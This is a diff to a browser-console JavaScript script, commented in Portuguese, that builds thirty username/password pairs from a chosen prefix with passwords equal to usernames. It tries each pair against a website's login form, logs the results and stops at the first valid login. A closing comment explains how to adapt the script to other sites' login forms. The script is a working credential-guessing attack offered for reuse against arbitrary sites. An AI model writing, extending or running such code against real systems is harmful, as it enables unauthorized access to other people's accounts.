@@ -2,11 +2,14 @@
 const usuarios = [];
 const senhas = [];
 
-// Preenche as listas com "yan01" a "yan30".
+// Pergunta ao usuário pelo prefixo desejado
+const prefixoUsuario = prompt("Digite o prefixo para os usuários (ex: yan):") || "usuario"; // Se não digitar nada, usa "usuario"
+
+// Preenche as listas com o prefixo fornecido e números de 01 a 30.
 for (let i = 1; i <= 30; i++) {
     const numFormatado = String(i).padStart(2, '0');
-    usuarios.push(`yan${numFormatado}`);
-    senhas.push(`yan${numFormatado}`);
+    usuarios.push(`${prefixoUsuario}${numFormatado}`);
+    senhas.push(`${prefixoUsuario}${numFormatado}`);
 }
 
 // *** ADIÇÃO: Lista de usuários a serem excluídos ***
@@ -63,8 +66,7 @@ async function tentarLogin(usuario, senha) {
         console.log(`%c[SUCESSO] Login com ${usuario}/${senha}`, 'color: green;'); // Login bem-sucedido!
         return true;
     } else {
-        console.error(`%c[FALHA] Login com ${usuario}/${senha}`, 'color: red;'); // Login falhou!
-        return false;
+        return false; // Login falhou!
     }
 }
 
@@ -87,11 +89,17 @@ async function executarTestes() {
             continue;
         }
 
-        console.log(`%c[TESTE] Tentando ${usuario}/${senha}`, 'color: RoyalBlue;');
-
-        if (await tentarLogin(usuario, senha)) {
-            console.groupEnd(); // Encerra o grupo de logs
+        // *** ADIÇÃO: Mensagem de alerta dentro de um grupo recolhido ***
+        console.groupCollapsed(`%c[TESTE] Tentando ${usuario}/${senha}`, 'color: RoyalBlue;');
+        console.log('%c[ALERTA] 💡 Se você for redirecionado para outra página após esta mensagem, significa que o login foi bem-sucedido! ✅', 'color: DarkSeaGreen; font-weight: bold;');
+        console.groupEnd() //fechando aqui
+        const loginSucesso = await tentarLogin(usuario, senha);
+        if (loginSucesso) {
+            console.log(`%c[SUCESSO] Login com ${usuario}/${senha}`, 'color: green;'); // Login bem-sucedido!
+            console.groupEnd();
             return; // Para ao encontrar um login válido.
+        } else {
+            console.error(`%c[FALHA] Login com ${usuario}/${senha}`, 'color: red;'); // Login falhou!
         }
     }
 
@@ -101,7 +109,8 @@ async function executarTestes() {
 
 executarTestes();
 
-/* **Adaptando para outro site:**
+/*
+**Adaptando para outro site:**
 1. Inspecione o HTML do login.
 2. Adapte os seletores CSS em `tentarLogin()`.
 3. Adapte a lógica de sucesso em `tentarLogin()`.
